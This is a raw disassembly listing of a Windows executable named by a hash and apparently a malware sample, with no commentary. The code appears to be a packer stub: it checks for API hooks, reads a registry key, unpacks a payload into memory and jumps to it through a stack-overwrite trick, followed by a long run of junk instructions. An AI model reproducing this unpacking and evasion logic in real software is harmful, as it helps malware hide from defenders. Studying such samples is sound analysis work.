
41e8886917b40e9cf90e569d0b4427c705629396eba789a64c08de5ccce6a29e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	call   0x401470
  401008:	mov    eax,ds:0x41f188
  40100d:	push   eax
  40100e:	call   0x401040
  401013:	add    esp,0x4
  401016:	mov    ds:0x41f18c,eax
  40101b:	pop    ebp
  40101c:	ret    
  40101d:	int3   
  40101e:	int3   
  40101f:	int3   
  401020:	push   ebp
  401021:	mov    ebp,esp
  401023:	call   0x401000
  401028:	mov    eax,ds:0x41f18c
  40102d:	push   eax
  40102e:	call   0x401fc0
  401033:	add    esp,0x4
  401036:	mov    ds:0x41f190,eax
  40103b:	pop    ebp
  40103c:	ret    
  40103d:	int3   
  40103e:	int3   
  40103f:	int3   
  401040:	push   ebp
  401041:	mov    ebp,esp
  401043:	mov    eax,DWORD PTR [ebp+0x8]
  401046:	mov    eax,DWORD PTR [eax-0x4]
  401049:	pop    ebp
  40104a:	ret    
  40104b:	int3   
  40104c:	int3   
  40104d:	int3   
  40104e:	int3   
  40104f:	int3   
  401050:	push   ebp
  401051:	mov    ebp,esp
  401053:	mov    eax,ds:0x41f0c8
  401058:	mov    ds:0x41f194,eax
  40105d:	pop    ebp
  40105e:	ret    
  40105f:	int3   
  401060:	push   ebp
  401061:	mov    ebp,esp
  401063:	sub    esp,0x2c8
  401069:	push   ebx
  40106a:	push   esi
  40106b:	push   edi
  40106c:	mov    DWORD PTR [ebp-0x28c],0x402070
  401076:	mov    DWORD PTR ds:0x41f198,ebp
  40107c:	pusha  
  40107d:	call   0x401050
  401082:	mov    eax,ds:0x41f194
  401087:	movzx  ecx,BYTE PTR [eax]
  40108a:	cmp    ecx,0x8b
  401090:	je     0x4010b3
  401092:	mov    edx,DWORD PTR ds:0x41f194
  401098:	movzx  eax,BYTE PTR [edx]
  40109b:	cmp    eax,0x55
  40109e:	je     0x4010b3
  4010a0:	mov    ecx,DWORD PTR ds:0x41f194
  4010a6:	movzx  edx,BYTE PTR [ecx]
  4010a9:	cmp    edx,0x6a
  4010ac:	je     0x4010b3
  4010ae:	call   0x4013f0
  4010b3:	mov    DWORD PTR [ebp-0x290],0x0
  4010bd:	mov    DWORD PTR [ebp-0x2a0],0x80000002
  4010c7:	call   0x401370
  4010cc:	test   eax,eax
  4010ce:	je     0x401108
  4010d0:	call   0x401440
  4010d5:	mov    eax,ds:0x41f188
  4010da:	push   eax
  4010db:	call   0x401040
  4010e0:	add    esp,0x4
  4010e3:	mov    ds:0x41f18c,eax
  4010e8:	mov    ecx,DWORD PTR ds:0x41f18c
  4010ee:	push   ecx
  4010ef:	call   0x401fc0
  4010f4:	add    esp,0x4
  4010f7:	mov    ds:0x41f19c,eax
  4010fc:	mov    edx,DWORD PTR ds:0x41f18c
  401102:	mov    DWORD PTR [ebp-0x298],edx
  401108:	mov    DWORD PTR [ebp-0x284],0x64
  401112:	mov    DWORD PTR [ebp-0x224],0x1
  40111c:	mov    DWORD PTR [ebp-0x290],0x0
  401126:	mov    DWORD PTR [ebp-0x258],0x0
  401130:	mov    DWORD PTR [ebp-0x280],0x1
  40113a:	mov    DWORD PTR [ebp-0x21c],0x0
  401144:	mov    eax,DWORD PTR [ebp-0x290]
  40114a:	cmp    eax,DWORD PTR ds:0x41f18c
  401150:	jae    0x4011dc
  401156:	mov    ecx,DWORD PTR [ebp-0x298]
  40115c:	push   ecx
  40115d:	mov    edx,DWORD PTR [ebp-0x284]
  401163:	push   edx
  401164:	call   0x402110
  401169:	add    esp,0x8
  40116c:	mov    DWORD PTR [ebp-0x29c],eax
  401172:	mov    eax,DWORD PTR [ebp-0x29c]
  401178:	push   eax
  401179:	mov    ecx,DWORD PTR ds:0x41f188
  40117f:	add    ecx,DWORD PTR [ebp-0x258]
  401185:	push   ecx
  401186:	mov    edx,DWORD PTR ds:0x41f19c
  40118c:	add    edx,DWORD PTR [ebp-0x290]
  401192:	push   edx
  401193:	call   0x401e20
  401198:	add    esp,0xc
  40119b:	mov    eax,DWORD PTR [ebp-0x224]
  4011a1:	add    eax,DWORD PTR [ebp-0x284]
  4011a7:	add    eax,DWORD PTR [ebp-0x258]
  4011ad:	mov    DWORD PTR [ebp-0x258],eax
  4011b3:	mov    ecx,DWORD PTR [ebp-0x290]
  4011b9:	add    ecx,DWORD PTR [ebp-0x284]
  4011bf:	mov    DWORD PTR [ebp-0x290],ecx
  4011c5:	mov    edx,DWORD PTR [ebp-0x298]
  4011cb:	sub    edx,DWORD PTR [ebp-0x29c]
  4011d1:	mov    DWORD PTR [ebp-0x298],edx
  4011d7:	jmp    0x401144
  4011dc:	mov    eax,ds:0x41f18c
  4011e1:	push   eax
  4011e2:	mov    ecx,DWORD PTR ds:0x41f19c
  4011e8:	push   ecx
  4011e9:	call   0x402190
  4011ee:	add    esp,0x8
  4011f1:	mov    DWORD PTR [ebp-0x258],0x0
  4011fb:	mov    DWORD PTR [ebp-0x2bc],0x0
  401205:	mov    edx,DWORD PTR ds:0x41f18c
  40120b:	push   edx
  40120c:	push   0x0
  40120e:	mov    eax,ds:0x41f190
  401213:	push   eax
  401214:	call   0x401020
  401219:	add    esp,0xc
  40121c:	mov    ecx,DWORD PTR ds:0x41f18c
  401222:	mov    DWORD PTR [ebp-0x2c4],ecx
  401228:	mov    edx,DWORD PTR [ebp-0x2bc]
  40122e:	cmp    edx,DWORD PTR ds:0x41f18c
  401234:	jae    0x4012bf
  40123a:	mov    eax,DWORD PTR [ebp-0x2c4]
  401240:	push   eax
  401241:	mov    ecx,DWORD PTR [ebp-0x284]
  401247:	push   ecx
  401248:	call   0x402110
  40124d:	add    esp,0x8
  401250:	mov    DWORD PTR [ebp-0x2c8],eax
  401256:	mov    edx,DWORD PTR [ebp-0x2c8]
  40125c:	push   edx
  40125d:	mov    eax,ds:0x41f188
  401262:	add    eax,DWORD PTR [ebp-0x258]
  401268:	push   eax
  401269:	mov    ecx,DWORD PTR ds:0x41f190
  40126f:	add    ecx,DWORD PTR [ebp-0x2bc]
  401275:	push   ecx
  401276:	call   0x401e20
  40127b:	add    esp,0xc
  40127e:	mov    edx,DWORD PTR [ebp-0x224]
  401284:	add    edx,DWORD PTR [ebp-0x284]
  40128a:	add    edx,DWORD PTR [ebp-0x258]
  401290:	mov    DWORD PTR [ebp-0x258],edx
  401296:	mov    eax,DWORD PTR [ebp-0x2bc]
  40129c:	add    eax,DWORD PTR [ebp-0x284]
  4012a2:	mov    DWORD PTR [ebp-0x2bc],eax
  4012a8:	mov    ecx,DWORD PTR [ebp-0x2c4]
  4012ae:	sub    ecx,DWORD PTR [ebp-0x2c8]
  4012b4:	mov    DWORD PTR [ebp-0x2c4],ecx
  4012ba:	jmp    0x401228
  4012bf:	mov    edx,DWORD PTR ds:0x41f18c
  4012c5:	push   edx
  4012c6:	mov    eax,ds:0x41f190
  4012cb:	push   eax
  4012cc:	call   0x402190
  4012d1:	add    esp,0x8
  4012d4:	mov    DWORD PTR [ebp-0x28c],0x402070
  4012de:	mov    ecx,DWORD PTR ds:0x41f19c
  4012e4:	mov    edx,DWORD PTR ds:0x41f190
  4012ea:	mov    DWORD PTR [ecx],edx
  4012ec:	push   0x19000
  4012f1:	call   0x401fc0
  4012f6:	add    esp,0x4
  4012f9:	mov    ds:0x41f1a0,eax
  4012fe:	mov    eax,ds:0x41f1a0
  401303:	add    eax,0x200
  401308:	mov    ds:0x41f1a4,eax
  40130d:	push   0x17700
  401312:	mov    ecx,DWORD PTR ds:0x41f19c
  401318:	push   ecx
  401319:	mov    edx,DWORD PTR ds:0x41f1a4
  40131f:	push   edx
  401320:	call   0x401e20
  401325:	add    esp,0xc
  401328:	mov    eax,ds:0x41f1a0
  40132d:	add    eax,0x17590
  401332:	mov    ds:0x41f1a8,eax
  401337:	mov    ecx,ecx
  401339:	mov    ecx,ecx
  40133b:	mov    ecx,ecx
  40133d:	popa   
  40133e:	mov    ecx,ecx
  401340:	mov    ecx,ecx
  401342:	mov    ecx,ecx
  401344:	mov    ecx,ecx
  401346:	push   0x37
  401348:	mov    eax,DWORD PTR [ebp-0x28c]
  40134e:	mov    ecx,ecx
  401350:	mov    ecx,ecx
  401352:	mov    ecx,esp
  401354:	sub    ecx,0x22
  401357:	mov    edx,0x1e
  40135c:	mov    edx,edx
  40135e:	mov    DWORD PTR [ecx+edx*1+0x4],eax
  401362:	mov    edx,edx
  401364:	ret    
  401365:	mov    edx,edx
  401367:	xor    eax,eax
  401369:	pop    edi
  40136a:	pop    esi
  40136b:	pop    ebx
  40136c:	mov    esp,ebp
  40136e:	pop    ebp
  40136f:	ret    
  401370:	push   ebp
  401371:	mov    ebp,esp
  401373:	sub    esp,0x14
  401376:	mov    eax,ds:0x41f0cc
  40137b:	mov    DWORD PTR [ebp-0x10],eax
  40137e:	mov    DWORD PTR [ebp-0xc],0x41e010
  401385:	mov    DWORD PTR [ebp-0x4],0x41e070
  40138c:	mov    ecx,DWORD PTR ds:0x41f0e4
  401392:	mov    DWORD PTR [ebp-0x8],ecx
  401395:	lea    edx,[ebp-0x14]
  401398:	push   edx
  401399:	mov    eax,DWORD PTR [ebp-0xc]
  40139c:	push   eax
  40139d:	push   0x80000002
  4013a2:	call   DWORD PTR [ebp-0x8]
  4013a5:	test   eax,eax
  4013a7:	jne    0x4013b2
  4013a9:	mov    eax,0x1
  4013ae:	jmp    0x4013e4
  4013b0:	jmp    0x4013bb
  4013b2:	call   0x401370
  4013b7:	xor    eax,eax
  4013b9:	jmp    0x4013e4
  4013bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4013be:	movzx  edx,BYTE PTR [ecx]
  4013c1:	cmp    edx,0x55
  4013c4:	je     0x4013e4
  4013c6:	mov    eax,DWORD PTR [ebp-0x10]
  4013c9:	movzx  ecx,BYTE PTR [eax]
  4013cc:	cmp    ecx,0x8b
  4013d2:	je     0x4013e4
  4013d4:	mov    edx,DWORD PTR [ebp-0x10]
  4013d7:	movzx  eax,BYTE PTR [edx]
  4013da:	cmp    eax,0x6a
  4013dd:	je     0x4013e4
  4013df:	call   0x4013f0
  4013e4:	mov    esp,ebp
  4013e6:	pop    ebp
  4013e7:	ret    
  4013e8:	int3   
  4013e9:	int3   
  4013ea:	int3   
  4013eb:	int3   
  4013ec:	int3   
  4013ed:	int3   
  4013ee:	int3   
  4013ef:	int3   
  4013f0:	push   ebp
  4013f1:	mov    ebp,esp
  4013f3:	call   0x401060
  4013f8:	pop    ebp
  4013f9:	ret    
  4013fa:	int3   
  4013fb:	int3   
  4013fc:	int3   
  4013fd:	int3   
  4013fe:	int3   
  4013ff:	int3   
  401400:	push   ebp
  401401:	mov    ebp,esp
  401403:	mov    eax,ds:0x41f1ac
  401408:	sub    eax,0x8
  40140b:	shr    eax,1
  40140d:	mov    ds:0x41f1ac,eax
  401412:	pop    ebp
  401413:	ret    
  401414:	int3   
  401415:	int3   
  401416:	int3   
  401417:	int3   
  401418:	int3   
  401419:	int3   
  40141a:	int3   
  40141b:	int3   
  40141c:	int3   
  40141d:	int3   
  40141e:	int3   
  40141f:	int3   
  401420:	push   ebp
  401421:	mov    ebp,esp
  401423:	pop    ebp
  401424:	ret    0x10
  401427:	int3   
  401428:	int3   
  401429:	int3   
  40142a:	int3   
  40142b:	int3   
  40142c:	int3   
  40142d:	int3   
  40142e:	int3   
  40142f:	int3   
  401430:	push   ebp
  401431:	mov    ebp,esp
  401433:	pop    ebp
  401434:	ret    0x10
  401437:	int3   
  401438:	int3   
  401439:	int3   
  40143a:	int3   
  40143b:	int3   
  40143c:	int3   
  40143d:	int3   
  40143e:	int3   
  40143f:	int3   
  401440:	push   ebp
  401441:	mov    ebp,esp
  401443:	sub    esp,0x10
  401446:	mov    DWORD PTR [ebp-0x10],0x405f61
  40144d:	mov    DWORD PTR [ebp-0x4],0x4
  401454:	mov    eax,DWORD PTR [ebp-0x10]
  401457:	add    eax,DWORD PTR [ebp-0x4]
  40145a:	mov    DWORD PTR [ebp-0xc],eax
  40145d:	mov    ecx,DWORD PTR [ebp-0xc]
  401460:	mov    DWORD PTR [ebp-0x8],ecx
  401463:	mov    edx,DWORD PTR [ebp-0x8]
  401466:	mov    DWORD PTR ds:0x41f188,edx
  40146c:	mov    esp,ebp
  40146e:	pop    ebp
  40146f:	ret    
  401470:	push   ebp
  401471:	mov    ebp,esp
  401473:	sub    esp,0x8
  401476:	mov    DWORD PTR [ebp-0x4],0x4
  40147d:	mov    eax,DWORD PTR [ebp-0x4]
  401480:	add    eax,0x405d58
  401485:	mov    ds:0x41f188,eax
  40148a:	mov    ecx,DWORD PTR ds:0x41f0e8
  401490:	mov    DWORD PTR [ebp-0x8],ecx
  401493:	mov    esp,ebp
  401495:	pop    ebp
  401496:	ret    
  401497:	int3   
  401498:	int3   
  401499:	int3   
  40149a:	int3   
  40149b:	int3   
  40149c:	int3   
  40149d:	int3   
  40149e:	int3   
  40149f:	int3   
  4014a0:	push   ebp
  4014a1:	mov    ebp,esp
  4014a3:	sub    esp,0x8
  4014a6:	mov    DWORD PTR [ebp-0x4],0x86de
  4014ad:	mov    DWORD PTR [ebp-0x4],0x86de
  4014b4:	mov    DWORD PTR [ebp-0x4],0x86de
  4014bb:	mov    DWORD PTR [ebp-0x4],0x86de
  4014c2:	mov    DWORD PTR [ebp-0x4],0x86de
  4014c9:	mov    DWORD PTR [ebp-0x4],0x86de
  4014d0:	mov    DWORD PTR [ebp-0x4],0x86de
  4014d7:	mov    DWORD PTR [ebp-0x4],0x86de
  4014de:	mov    DWORD PTR [ebp-0x4],0x86de
  4014e5:	mov    DWORD PTR [ebp-0x4],0x86de
  4014ec:	mov    DWORD PTR [ebp-0x4],0x86de
  4014f3:	mov    DWORD PTR [ebp-0x4],0x86de
  4014fa:	mov    DWORD PTR [ebp-0x4],0x86de
  401501:	mov    DWORD PTR [ebp-0x4],0x86de
  401508:	mov    DWORD PTR [ebp-0x4],0x86de
  40150f:	mov    DWORD PTR [ebp-0x4],0x86de
  401516:	mov    DWORD PTR [ebp-0x4],0x86de
  40151d:	mov    DWORD PTR [ebp-0x4],0x86de
  401524:	mov    DWORD PTR [ebp-0x4],0x86de
  40152b:	mov    DWORD PTR [ebp-0x4],0x86de
  401532:	mov    DWORD PTR [ebp-0x4],0x86de
  401539:	mov    DWORD PTR [ebp-0x4],0x86de
  401540:	mov    DWORD PTR [ebp-0x4],0x86de
  401547:	mov    DWORD PTR [ebp-0x4],0x86de
  40154e:	mov    DWORD PTR [ebp-0x4],0x86de
  401555:	mov    DWORD PTR [ebp-0x4],0x86de
  40155c:	mov    DWORD PTR [ebp-0x4],0x86de
  401563:	mov    DWORD PTR [ebp-0x4],0x86de
  40156a:	mov    DWORD PTR [ebp-0x4],0x86de
  401571:	mov    DWORD PTR [ebp-0x4],0x86de
  401578:	mov    DWORD PTR [ebp-0x4],0x86de
  40157f:	mov    DWORD PTR [ebp-0x4],0x86de
  401586:	mov    DWORD PTR [ebp-0x4],0x86de
  40158d:	mov    DWORD PTR [ebp-0x4],0x86de
  401594:	mov    DWORD PTR [ebp-0x4],0x86de
  40159b:	mov    DWORD PTR [ebp-0x4],0x86de
  4015a2:	mov    DWORD PTR [ebp-0x4],0x86de
  4015a9:	mov    DWORD PTR [ebp-0x4],0x86de
  4015b0:	mov    DWORD PTR [ebp-0x4],0x86de
  4015b7:	mov    DWORD PTR [ebp-0x4],0x86de
  4015be:	mov    DWORD PTR [ebp-0x4],0x86de
  4015c5:	mov    DWORD PTR [ebp-0x4],0x86de
  4015cc:	mov    DWORD PTR [ebp-0x4],0x86de
  4015d3:	mov    DWORD PTR [ebp-0x4],0x86de
  4015da:	mov    DWORD PTR [ebp-0x4],0x86de
  4015e1:	mov    DWORD PTR [ebp-0x4],0x86de
  4015e8:	mov    DWORD PTR [ebp-0x4],0x86de
  4015ef:	mov    DWORD PTR [ebp-0x4],0x86de
  4015f6:	mov    DWORD PTR [ebp-0x4],0x86de
  4015fd:	mov    DWORD PTR [ebp-0x4],0x86de
  401604:	mov    DWORD PTR [ebp-0x4],0x86de
  40160b:	mov    DWORD PTR [ebp-0x4],0x86de
  401612:	mov    DWORD PTR [ebp-0x4],0x86de
  401619:	mov    DWORD PTR [ebp-0x4],0x86de
  401620:	mov    DWORD PTR [ebp-0x4],0x86de
  401627:	mov    DWORD PTR [ebp-0x4],0x86de
  40162e:	mov    DWORD PTR [ebp-0x4],0x86de
  401635:	mov    DWORD PTR [ebp-0x4],0x86de
  40163c:	mov    DWORD PTR [ebp-0x4],0x86de
  401643:	mov    DWORD PTR [ebp-0x4],0x86de
  40164a:	mov    DWORD PTR [ebp-0x4],0x86de
  401651:	mov    DWORD PTR [ebp-0x4],0x86de
  401658:	mov    DWORD PTR [ebp-0x4],0x86de
  40165f:	mov    DWORD PTR [ebp-0x4],0x86de
  401666:	mov    DWORD PTR [ebp-0x4],0x86de
  40166d:	mov    DWORD PTR [ebp-0x4],0x86de
  401674:	mov    DWORD PTR [ebp-0x4],0x86de
  40167b:	mov    DWORD PTR [ebp-0x4],0x86de
  401682:	mov    DWORD PTR [ebp-0x4],0x86de
  401689:	mov    DWORD PTR [ebp-0x4],0x86de
  401690:	mov    DWORD PTR [ebp-0x4],0x86de
  401697:	mov    DWORD PTR [ebp-0x4],0x86de
  40169e:	mov    DWORD PTR [ebp-0x4],0x86de
  4016a5:	mov    DWORD PTR [ebp-0x4],0x86de
  4016ac:	mov    DWORD PTR [ebp-0x4],0x86de
  4016b3:	mov    DWORD PTR [ebp-0x4],0x86de
  4016ba:	mov    DWORD PTR [ebp-0x4],0x86de
  4016c1:	mov    DWORD PTR [ebp-0x4],0x86de
  4016c8:	mov    DWORD PTR [ebp-0x4],0x86de
  4016cf:	mov    DWORD PTR [ebp-0x4],0x86de
  4016d6:	mov    DWORD PTR [ebp-0x4],0x86de
  4016dd:	mov    DWORD PTR [ebp-0x4],0x86de
  4016e4:	mov    DWORD PTR [ebp-0x4],0x86de
  4016eb:	mov    DWORD PTR [ebp-0x4],0x86de
  4016f2:	mov    DWORD PTR [ebp-0x4],0x86de
  4016f9:	mov    DWORD PTR [ebp-0x4],0x86de
  401700:	mov    DWORD PTR [ebp-0x4],0x86de
  401707:	mov    DWORD PTR [ebp-0x4],0x86de
  40170e:	mov    DWORD PTR [ebp-0x4],0x86de
  401715:	mov    DWORD PTR [ebp-0x4],0x86de
  40171c:	mov    DWORD PTR [ebp-0x4],0x86de
  401723:	mov    DWORD PTR [ebp-0x4],0x86de
  40172a:	mov    DWORD PTR [ebp-0x4],0x86de
  401731:	mov    DWORD PTR [ebp-0x4],0x86de
  401738:	mov    DWORD PTR [ebp-0x4],0x86de
  40173f:	mov    DWORD PTR [ebp-0x4],0x86de
  401746:	mov    DWORD PTR [ebp-0x4],0x86de
  40174d:	mov    DWORD PTR [ebp-0x4],0x86de
  401754:	mov    DWORD PTR [ebp-0x4],0x86de
  40175b:	mov    DWORD PTR [ebp-0x4],0x86de
  401762:	mov    DWORD PTR [ebp-0x4],0x86de
  401769:	mov    DWORD PTR [ebp-0x4],0x86de
  401770:	mov    DWORD PTR [ebp-0x4],0x86de
  401777:	mov    DWORD PTR [ebp-0x4],0x86de
  40177e:	mov    DWORD PTR [ebp-0x4],0x86de
  401785:	mov    DWORD PTR [ebp-0x4],0x86de
  40178c:	mov    DWORD PTR [ebp-0x4],0x86de
  401793:	mov    DWORD PTR [ebp-0x4],0x86de
  40179a:	mov    DWORD PTR [ebp-0x4],0x86de
  4017a1:	mov    DWORD PTR [ebp-0x4],0x86de
  4017a8:	mov    DWORD PTR [ebp-0x4],0x86de
  4017af:	mov    DWORD PTR [ebp-0x4],0x86de
  4017b6:	mov    DWORD PTR [ebp-0x4],0x86de
  4017bd:	mov    DWORD PTR [ebp-0x4],0x86de
  4017c4:	mov    DWORD PTR [ebp-0x4],0x86de
  4017cb:	mov    DWORD PTR [ebp-0x4],0x86de
  4017d2:	mov    DWORD PTR [ebp-0x4],0x86de
  4017d9:	mov    DWORD PTR [ebp-0x4],0x86de
  4017e0:	mov    DWORD PTR [ebp-0x4],0x86de
  4017e7:	mov    DWORD PTR [ebp-0x4],0x86de
  4017ee:	mov    DWORD PTR [ebp-0x4],0x86de
  4017f5:	mov    DWORD PTR [ebp-0x4],0x86de
  4017fc:	mov    DWORD PTR [ebp-0x4],0x86de
  401803:	mov    DWORD PTR [ebp-0x4],0x86de
  40180a:	mov    DWORD PTR [ebp-0x4],0x86de
  401811:	mov    DWORD PTR [ebp-0x4],0x86de
  401818:	mov    DWORD PTR [ebp-0x4],0x86de
  40181f:	mov    DWORD PTR [ebp-0x4],0x86de
  401826:	mov    DWORD PTR [ebp-0x4],0x86de
  40182d:	mov    DWORD PTR [ebp-0x4],0x86de
  401834:	mov    DWORD PTR [ebp-0x4],0x86de
  40183b:	mov    DWORD PTR [ebp-0x4],0x86de
  401842:	mov    DWORD PTR [ebp-0x4],0x86de
  401849:	mov    DWORD PTR [ebp-0x4],0x86de
  401850:	mov    DWORD PTR [ebp-0x4],0x86de
  401857:	mov    DWORD PTR [ebp-0x4],0x86de
  40185e:	mov    DWORD PTR [ebp-0x4],0x86de
  401865:	mov    DWORD PTR [ebp-0x4],0x86de
  40186c:	mov    DWORD PTR [ebp-0x4],0x86de
  401873:	mov    DWORD PTR [ebp-0x4],0x86de
  40187a:	mov    DWORD PTR [ebp-0x4],0x86de
  401881:	mov    DWORD PTR [ebp-0x4],0x86de
  401888:	mov    DWORD PTR [ebp-0x4],0x86de
  40188f:	mov    DWORD PTR [ebp-0x4],0x86de
  401896:	mov    DWORD PTR [ebp-0x4],0x86de
  40189d:	mov    DWORD PTR [ebp-0x4],0x86de
  4018a4:	mov    DWORD PTR [ebp-0x4],0x86de
  4018ab:	mov    DWORD PTR [ebp-0x4],0x86de
  4018b2:	mov    DWORD PTR [ebp-0x4],0x86de
  4018b9:	mov    DWORD PTR [ebp-0x4],0x86de
  4018c0:	mov    DWORD PTR [ebp-0x4],0x86de
  4018c7:	mov    DWORD PTR [ebp-0x4],0x86de
  4018ce:	mov    DWORD PTR [ebp-0x4],0x86de
  4018d5:	mov    DWORD PTR [ebp-0x4],0x86de
  4018dc:	mov    DWORD PTR [ebp-0x4],0x86de
  4018e3:	mov    DWORD PTR [ebp-0x4],0x86de
  4018ea:	mov    DWORD PTR [ebp-0x4],0x86de
  4018f1:	mov    DWORD PTR [ebp-0x4],0x86de
  4018f8:	mov    DWORD PTR [ebp-0x4],0x86de
  4018ff:	mov    DWORD PTR [ebp-0x4],0x86de
  401906:	mov    DWORD PTR [ebp-0x4],0x86de
  40190d:	mov    DWORD PTR [ebp-0x4],0x86de
  401914:	mov    DWORD PTR [ebp-0x4],0x86de
  40191b:	mov    DWORD PTR [ebp-0x4],0x86de
  401922:	mov    DWORD PTR [ebp-0x4],0x86de
  401929:	mov    DWORD PTR [ebp-0x4],0x86de
  401930:	mov    DWORD PTR [ebp-0x4],0x86de
  401937:	mov    DWORD PTR [ebp-0x4],0x86de
  40193e:	mov    DWORD PTR [ebp-0x4],0x86de
  401945:	mov    DWORD PTR [ebp-0x4],0x86de
  40194c:	mov    DWORD PTR [ebp-0x4],0x86de
  401953:	mov    DWORD PTR [ebp-0x4],0x86de
  40195a:	mov    DWORD PTR [ebp-0x4],0x86de
  401961:	mov    DWORD PTR [ebp-0x4],0x86de
  401968:	mov    DWORD PTR [ebp-0x4],0x86de
  40196f:	mov    DWORD PTR [ebp-0x4],0x86de
  401976:	mov    DWORD PTR [ebp-0x4],0x86de
  40197d:	mov    DWORD PTR [ebp-0x4],0x86de
  401984:	mov    DWORD PTR [ebp-0x4],0x86de
  40198b:	mov    DWORD PTR [ebp-0x4],0x86de
  401992:	mov    DWORD PTR [ebp-0x4],0x86de
  401999:	mov    DWORD PTR [ebp-0x4],0x86de
  4019a0:	mov    DWORD PTR [ebp-0x4],0x86de
  4019a7:	mov    DWORD PTR [ebp-0x4],0x86de
  4019ae:	mov    DWORD PTR [ebp-0x4],0x86de
  4019b5:	mov    DWORD PTR [ebp-0x4],0x86de
  4019bc:	mov    DWORD PTR [ebp-0x4],0x86de
  4019c3:	mov    DWORD PTR [ebp-0x4],0x86de
  4019ca:	mov    DWORD PTR [ebp-0x4],0x86de
  4019d1:	mov    DWORD PTR [ebp-0x4],0x86de
  4019d8:	mov    DWORD PTR [ebp-0x4],0x86de
  4019df:	mov    DWORD PTR [ebp-0x4],0x86de
  4019e6:	mov    DWORD PTR [ebp-0x4],0x86de
  4019ed:	mov    DWORD PTR [ebp-0x4],0x86de
  4019f4:	mov    DWORD PTR [ebp-0x4],0x86de
  4019fb:	mov    DWORD PTR [ebp-0x4],0x86de
  401a02:	mov    DWORD PTR [ebp-0x4],0x86de
  401a09:	mov    DWORD PTR [ebp-0x4],0x86de
  401a10:	mov    DWORD PTR [ebp-0x4],0x86de
  401a17:	mov    DWORD PTR [ebp-0x4],0x86de
  401a1e:	mov    DWORD PTR [ebp-0x4],0x86de
  401a25:	mov    DWORD PTR [ebp-0x4],0x86de
  401a2c:	mov    DWORD PTR [ebp-0x4],0x86de
  401a33:	mov    DWORD PTR [ebp-0x4],0x86de
  401a3a:	mov    DWORD PTR [ebp-0x4],0x86de
  401a41:	mov    DWORD PTR [ebp-0x4],0x86de
  401a48:	mov    DWORD PTR [ebp-0x4],0x86de
  401a4f:	mov    DWORD PTR [ebp-0x4],0x86de
  401a56:	mov    DWORD PTR [ebp-0x4],0x86de
  401a5d:	mov    DWORD PTR [ebp-0x4],0x86de
  401a64:	mov    DWORD PTR [ebp-0x4],0x86de
  401a6b:	mov    DWORD PTR [ebp-0x4],0x86de
  401a72:	mov    DWORD PTR [ebp-0x4],0x86de
  401a79:	mov    DWORD PTR [ebp-0x4],0x86de
  401a80:	mov    DWORD PTR [ebp-0x4],0x86de
  401a87:	mov    DWORD PTR [ebp-0x4],0x86de
  401a8e:	mov    DWORD PTR [ebp-0x4],0x86de
  401a95:	mov    DWORD PTR [ebp-0x4],0x86de
  401a9c:	mov    DWORD PTR [ebp-0x4],0x86de
  401aa3:	mov    DWORD PTR [ebp-0x4],0x86de
  401aaa:	mov    DWORD PTR [ebp-0x4],0x86de
  401ab1:	mov    DWORD PTR [ebp-0x4],0x86de
  401ab8:	mov    DWORD PTR [ebp-0x4],0x86de
  401abf:	mov    DWORD PTR [ebp-0x4],0x86de
  401ac6:	mov    DWORD PTR [ebp-0x4],0x86de
  401acd:	mov    DWORD PTR [ebp-0x4],0x86de
  401ad4:	mov    DWORD PTR [ebp-0x4],0x86de
  401adb:	mov    DWORD PTR [ebp-0x4],0x86de
  401ae2:	mov    DWORD PTR [ebp-0x4],0x86de
  401ae9:	mov    DWORD PTR [ebp-0x4],0x86de
  401af0:	mov    DWORD PTR [ebp-0x4],0x86de
  401af7:	mov    DWORD PTR [ebp-0x4],0x86de
  401afe:	mov    DWORD PTR [ebp-0x4],0x86de
  401b05:	mov    DWORD PTR [ebp-0x4],0x86de
  401b0c:	mov    DWORD PTR [ebp-0x4],0x86de
  401b13:	mov    DWORD PTR [ebp-0x4],0x86de
  401b1a:	mov    DWORD PTR [ebp-0x4],0x86de
  401b21:	mov    DWORD PTR [ebp-0x4],0x86de
  401b28:	mov    DWORD PTR [ebp-0x4],0x86de
  401b2f:	mov    DWORD PTR [ebp-0x4],0x86de
  401b36:	mov    DWORD PTR [ebp-0x4],0x86de
  401b3d:	mov    DWORD PTR [ebp-0x4],0x86de
  401b44:	mov    DWORD PTR [ebp-0x4],0x86de
  401b4b:	mov    DWORD PTR [ebp-0x4],0x86de
  401b52:	mov    DWORD PTR [ebp-0x4],0x86de
  401b59:	mov    DWORD PTR [ebp-0x4],0x86de
  401b60:	mov    DWORD PTR [ebp-0x4],0x86de
  401b67:	mov    DWORD PTR [ebp-0x4],0x86de
  401b6e:	mov    DWORD PTR [ebp-0x4],0x86de
  401b75:	mov    DWORD PTR [ebp-0x4],0x86de
  401b7c:	mov    DWORD PTR [ebp-0x4],0x86de
  401b83:	mov    DWORD PTR [ebp-0x4],0x86de
  401b8a:	mov    DWORD PTR [ebp-0x4],0x86de
  401b91:	mov    DWORD PTR [ebp-0x4],0x86de
  401b98:	mov    DWORD PTR [ebp-0x4],0x86de
  401b9f:	mov    DWORD PTR [ebp-0x4],0x86de
  401ba6:	mov    DWORD PTR [ebp-0x4],0x86de
  401bad:	mov    DWORD PTR [ebp-0x4],0x86de
  401bb4:	mov    DWORD PTR [ebp-0x4],0x86de
  401bbb:	mov    DWORD PTR [ebp-0x4],0x86de
  401bc2:	mov    DWORD PTR [ebp-0x4],0x86de
  401bc9:	mov    DWORD PTR [ebp-0x4],0x86de
  401bd0:	mov    DWORD PTR [ebp-0x4],0x86de
  401bd7:	mov    DWORD PTR [ebp-0x4],0x86de
  401bde:	mov    DWORD PTR [ebp-0x4],0x86de
  401be5:	mov    DWORD PTR [ebp-0x4],0x86de
  401bec:	mov    DWORD PTR [ebp-0x4],0x86de
  401bf3:	mov    DWORD PTR [ebp-0x4],0x86de
  401bfa:	mov    DWORD PTR [ebp-0x4],0x86de
  401c01:	mov    DWORD PTR [ebp-0x4],0x86de
  401c08:	mov    DWORD PTR [ebp-0x4],0x86de
  401c0f:	mov    DWORD PTR [ebp-0x4],0x86de
  401c16:	mov    DWORD PTR [ebp-0x4],0x86de
  401c1d:	mov    DWORD PTR [ebp-0x4],0x86de
  401c24:	mov    DWORD PTR [ebp-0x4],0x86de
  401c2b:	mov    DWORD PTR [ebp-0x4],0x86de
  401c32:	mov    DWORD PTR [ebp-0x4],0x86de
  401c39:	mov    DWORD PTR [ebp-0x4],0x86de
  401c40:	mov    DWORD PTR [ebp-0x4],0x86de
